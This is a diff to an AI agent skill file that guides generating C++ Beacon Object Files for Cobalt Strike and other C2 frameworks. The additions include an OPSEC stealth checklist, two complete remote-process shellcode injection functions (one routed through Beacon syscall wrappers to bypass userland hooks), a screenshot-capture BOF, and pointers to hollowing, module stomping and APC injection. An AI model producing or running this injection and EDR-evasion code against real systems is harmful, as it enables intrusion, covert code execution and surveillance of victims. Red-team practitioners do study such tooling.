@@ -1,20 +1,21 @@
 ---
 name: cpp-bof
-description: "Generate, compile, and debug Beacon Object Files (BOF) in C++ for Cobalt Strike and compatible C2 frameworks. Use when the user asks to create a C++ BOF, leverage RAII/templates/classes inside a BOF, use typedef+GetProcAddress DFR, integrate COM/GDI+, or needs dual-build (BOF+EXE) patterns."
+description: "Generate, compile, and harden Beacon Object Files (BOF) in C++ for Cobalt Strike and compatible C2 frameworks. Use when creating a C++ BOF, leveraging RAII/templates/classes without runtime dependencies, using typedef+GetProcAddress DFR, integrating COM/GDI+, implementing dual-build (BOF+EXE), and improving structure, quality, and stealth posture."
 license: MIT
-compatibility: "Requires x86_64-w64-mingw32-g++ (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires Cobalt Strike or a compatible loader (e.g. COFFLoader, RunOF)."
+compatibility: "Requires x86_64-w64-mingw32-g++ (mingw-w64), python3. Scripts tested on Linux/WSL. BOF testing requires a COFF loader (COFFLoader, RunOF, or framework-specific loader)."
 metadata:
   author: AeonDave
-  version: "2.0"
+  version: "3.0"
   category: bof
   language: cpp
 ---
 
-# C++ Beacon Object Files (BOF) Development
+# C++ Beacon Object Files (BOF) — Development & Hardening
 
-This skill produces production-quality BOFs in C++. C++ offers advantages
-for complex BOFs: RAII for handle management, templates, stronger type safety,
-and COM/GDI+ integration. Patterns are derived from real-world C++ BOFs.
+This skill produces production-quality, OPSEC-conscious BOFs in C++.
+Patterns are framework-agnostic and suitable for BOF-compatible COFF loaders.
+C++ is used deliberately for structure and safety (RAII, scoped abstractions,
+type discipline) while remaining runtime-free.
 
 ## When to use
 
@@ -23,6 +24,18 @@ and COM/GDI+ integration. Patterns are derived from real-world C++ BOFs.
 - Need RAII patterns for automatic handle/resource cleanup inside BOFs
 - Converting existing C++ code into a BOF
 - Need dual-build support (`#ifdef BOF` / standalone EXE)
+- Need practical stealth guidance while staying generic to different BOF loaders
+
+---
+
+## Recommended workflow
+
+1. **Scope** — define target, privilege, execution model, and API surface
+2. **Skeleton** — create runtime-free C++ BOF scaffold (`extern "C" go`)
+3. **Implement** — add RAII wrappers and explicit cleanup boundaries
+4. **Harden** — apply DFR minimization and OPSEC checks
+5. **Compile** — enforce no-exception/no-RTTI profile
+6. **Validate** — test on at least one local COFF loader plus target framework
 
 ---
 
@@ -115,26 +128,20 @@ Call `ResolveAPIs()` at the top of `go()` before using any resolved pointer.
 
 ## Step 3 — RAII wrappers
 
-C++ shines in BOFs with RAII for automatic cleanup:
+C++ shines in BOFs with RAII for automatic cleanup. All wrappers live in the
+`bof` namespace (see `assets/bof_helpers.hpp`):
 
 ```cpp
-class BofHandle {
-    HANDLE h_;
-public:
-    explicit BofHandle(HANDLE h = NULL) : h_(h) {}
-    ~BofHandle() {
-        if (h_ && h_ != INVALID_HANDLE_VALUE)
-            KERNEL32$CloseHandle(h_);
-    }
-    operator HANDLE() const { return h_; }
-    HANDLE* operator&() { return &h_; }
-    bool valid() const { return h_ && h_ != INVALID_HANDLE_VALUE; }
-    BofHandle(const BofHandle&) = delete;
-    BofHandle& operator=(const BofHandle&) = delete;
-};
+#include "bof_helpers.hpp"
+
+/* Usage: */
+bof::Handle hProc(KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid));
+if (!hProc.valid()) { /* error */ }
+/* hProc auto-closed by destructor */
 ```
 
-See `assets/bof_helpers.hpp` for additional wrappers (BofRegKey, BofFormat).
+Available wrappers: `bof::Handle`, `bof::HeapBuf`, `bof::Format`, `bof::RegKey`.
+See `references/cpp-raii.md` for the full library and factory RAII patterns.
 
 ---
 
@@ -152,6 +159,84 @@ See `assets/bof_helpers.hpp` for additional wrappers (BofRegKey, BofFormat).
 | `-fno-asynchronous-unwind-tables` | Reduce `.eh_frame` |
 | `-fpack-struct=8` | Match Beacon struct packing |
 | `-std=c++17` | Modern C++ features |
+
+---
+
+## Structure and quality rules
+
+- Keep `go()` thin: parse args, call 1 orchestration function, return
+- Put heavy logic in small static helpers with explicit input/output contracts
+- RAII wrappers must be move-safe or non-copyable; avoid hidden ownership transfer
+- Build each BOF as one operational unit (clear mode table + consistent error model)
+- Prefer deterministic cleanup labels for mixed C/C++ resources
+- Keep logging compact and operator-focused (status + key IDs)
+
+Suggested file layout inside one source file:
+
+1. Header / protocol comment
+2. DFR declarations or resolver typedefs
+3. Tiny RAII wrappers (`Handle`, `HeapBuf`, `Format`)
+4. Technique helpers
+5. `run_mode_*` functions
+6. `go()` entrypoint
+
+---
+
+## Stealthness checklist (generic)
+
+- [ ] No exceptions, RTTI, STL, iostreams, or hidden runtime pulls
+- [ ] No persistent RWX mappings; use RW → RX transitions
+- [ ] Minimized import surface (DFR or runtime resolve)
+- [ ] No static `syscall` instruction in BOF-generated code paths
+- [ ] Encrypted payload material zeroized after use
+- [ ] No hardcoded workstation-specific paths or usernames
+- [ ] Error paths release every handle and heap allocation
+
+For deeper guidance see `references/stealth-and-opsec.md`.
+
+### Indirect syscalls via Beacon API (CS 4.10+)
+
+When targeting Cobalt Strike 4.10+, prefer Beacon syscall wrappers over
+direct ntdll calls. These wrappers follow the framework's configured syscall
+strategy (direct, indirect, or patched) without embedding `syscall` instructions
+in BOF code.
+
+```cpp
+/* ── Beacon syscall wrappers (CS 4.10+) ───────────────── */
+/* These are resolved by the Beacon loader, not via DFR    */
+extern "C" {
+DECLSPEC_IMPORT NTSTATUS NTAPI BeaconGetSyscallInformation(LPVOID, DWORD);
+DECLSPEC_IMPORT HANDLE   WINAPI BeaconVirtualAllocEx(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
+DECLSPEC_IMPORT BOOL     WINAPI BeaconVirtualProtectEx(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
+DECLSPEC_IMPORT BOOL     WINAPI BeaconWriteProcessMemory(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
+DECLSPEC_IMPORT HANDLE   WINAPI BeaconOpenProcess(DWORD, BOOL, DWORD);
+DECLSPEC_IMPORT BOOL     WINAPI BeaconCloseHandle(HANDLE);
+}
+
+/* Usage: identical to Win32 counterparts but routed through
+ * the framework's syscall layer, bypassing userland hooks. */
+static BOOL inject_with_syscalls(DWORD pid, BYTE* payload, SIZE_T sz) {
+    bof::Handle hProc(BeaconOpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid));
+    if (!hProc.valid()) return FALSE;
+
+    LPVOID remoteBuf = BeaconVirtualAllocEx(hProc, NULL, sz,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuf) return FALSE;
+
+    BeaconWriteProcessMemory(hProc, remoteBuf, payload, sz, NULL);
+
+    DWORD oldProt;
+    BeaconVirtualProtectEx(hProc, remoteBuf, sz, PAGE_EXECUTE_READ, &oldProt);
+
+    KERNEL32$CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
+    return TRUE;
+}
+```
+
+When Beacon wrappers are unavailable, see `references/stealth-and-opsec.md`
+for InlineWhispers3 integration as a fallback.
 
 ---
 
@@ -287,6 +372,36 @@ pStream->Release();
 | Namespaces, `auto`, references | RTTI (`dynamic_cast`, `typeid`) |
 | Lambda (no capture) | Global objects with constructors |
 
+### Injection patterns
+
+For process injection techniques (remote thread, manual mapping, hollowing,
+module stomping, APC), see the **`c-bof`** skill's
+`references/injection-patterns.md` — all patterns are C-compatible and work
+directly in C++ BOFs. When using them in C++, wrap handles and buffers with
+`bof::Handle` and `bof::HeapBuf` for automatic cleanup:
+
+```cpp
+/* C++ RAII wrapper around the C injection pattern */
+static BOOL inject_cpp(DWORD pid, BYTE* payload, SIZE_T sz) {
+    bof::Handle hProc(KERNEL32$OpenProcess(
+        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, pid));
+    if (!hProc.valid()) return FALSE;
+
+    LPVOID remoteBuf = KERNEL32$VirtualAllocEx(hProc, NULL, sz,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteBuf) return FALSE;
+
+    KERNEL32$WriteProcessMemory(hProc, remoteBuf, payload, sz, NULL);
+    DWORD oldProt;
+    KERNEL32$VirtualProtectEx(hProc, remoteBuf, sz, PAGE_EXECUTE_READ, &oldProt);
+
+    KERNEL32$CreateRemoteThread(hProc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)remoteBuf, NULL, 0, NULL);
+    return TRUE;
+    /* hProc auto-closed by bof::Handle destructor */
+}
+```
+
 ---
 
 ## Complete example — screenshot.cpp
@@ -306,14 +421,45 @@ pStream->Release();
 extern "C" {
 #include "beacon.h"
 }
+#include "bof_helpers.hpp"
+
+/* ── GDI-specific RAII (not in bof_helpers — technique-local) ── */
+namespace bof {
+
+class GdiObj {
+    HGDIOBJ obj_;
+public:
+    explicit GdiObj(HGDIOBJ o = NULL) : obj_(o) {}
+    ~GdiObj() { if (obj_) pDeleteObject(obj_); }
+    operator HGDIOBJ() const { return obj_; }
+    GdiObj(const GdiObj&) = delete;
+    GdiObj& operator=(const GdiObj&) = delete;
+};
+
+class GdiDC {
+    HDC hdc_;
+    bool own_;  /* true = DeleteDC, false = ReleaseDC(hwnd) */
+    HWND hwnd_;
+public:
+    static GdiDC owned(HDC hdc) { return GdiDC(hdc, true, NULL); }
+    static GdiDC borrowed(HDC hdc, HWND hwnd) { return GdiDC(hdc, false, hwnd); }
+    ~GdiDC() {
+        if (!hdc_) return;
+        if (own_) pDeleteDC(hdc_);
+        else pReleaseDC(hwnd_, hdc_);
+    }
+    operator HDC() const { return hdc_; }
+    GdiDC(const GdiDC&) = delete;
+    GdiDC& operator=(const GdiDC&) = delete;
+private:
+    GdiDC(HDC hdc, bool own, HWND hwnd) : hdc_(hdc), own_(own), hwnd_(hwnd) {}
+};
+
+} /* namespace bof */
 
 /* ── KERNEL32 (DECLSPEC_IMPORT — few calls) ───────────── */
 DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
 DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
-DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
-DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetProcessHeap(void);
-DECLSPEC_IMPORT LPVOID  WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
-DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 
 /* ── GDI32 / USER32 (typedef — many calls) ────────────── */
 typedef HDC     (WINAPI *fnGetDC)(HWND);
@@ -365,10 +511,11 @@ extern "C" void go(char* args, int len) {
     int cx = pGetSystemMetrics(0 /* SM_CXSCREEN */);
     int cy = pGetSystemMetrics(1 /* SM_CYSCREEN */);
 
-    HDC hdcScreen = pGetDC(NULL);
-    HDC hdcMem    = pCreateCompatibleDC(hdcScreen);
-    HBITMAP hBmp  = pCreateCompatibleBitmap(hdcScreen, cx, cy);
-    HGDIOBJ hOld  = pSelectObject(hdcMem, hBmp);
+    /* RAII: all resources auto-cleaned on scope exit */
+    bof::GdiDC hdcScreen(bof::GdiDC::borrowed(pGetDC(NULL), NULL));
+    bof::GdiDC hdcMem(bof::GdiDC::owned(pCreateCompatibleDC(hdcScreen)));
+    bof::GdiObj hBmp(pCreateCompatibleBitmap(hdcScreen, cx, cy));
+    HGDIOBJ hOld = pSelectObject(hdcMem, hBmp);
 
     pBitBlt(hdcMem, 0, 0, cx, cy, hdcScreen, 0, 0, 0x00CC0020 /* SRCCOPY */);
 
@@ -378,11 +525,9 @@ extern "C" void go(char* args, int len) {
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Captured %dx%d screen", cx, cy);
 
-    /* Cleanup */
+    /* Restore original selection before GdiObj destructor runs */
     pSelectObject(hdcMem, hOld);
-    pDeleteObject(hBmp);
-    pDeleteDC(hdcMem);
-    pReleaseDC(NULL, hdcScreen);
+    /* All handles freed automatically by RAII destructors */
 }
 ```
 
@@ -394,6 +539,9 @@ extern "C" void go(char* args, int len) {
 |------|-------------|
 | `scripts/bof_template.cpp`         | Production C++ BOF skeleton with RAII + DFR |
 | `scripts/build_bof.sh`             | Compiler wrapper with C++ flags |
+| `references/cpp-raii.md`           | RAII patterns, safe C++ feature matrix, pitfalls |
+| `references/dfr-and-resolution.md` | DFR strategies for C++ BOFs, typedef+GetProcAddress, COM/GDI+ |
+| `references/stealth-and-opsec.md`  | OPSEC hardening for C++ BOFs, dual-build, memory hygiene |
 | `references/REFERENCE.md`          | C++ BOF patterns, DFR reference, pitfalls |
 | `assets/beacon.h`                  | Official Cobalt Strike beacon header (CS 4.12) |
 | `assets/beacon_compatibility.h`    | Convenience macros, missing mingw typedefs |
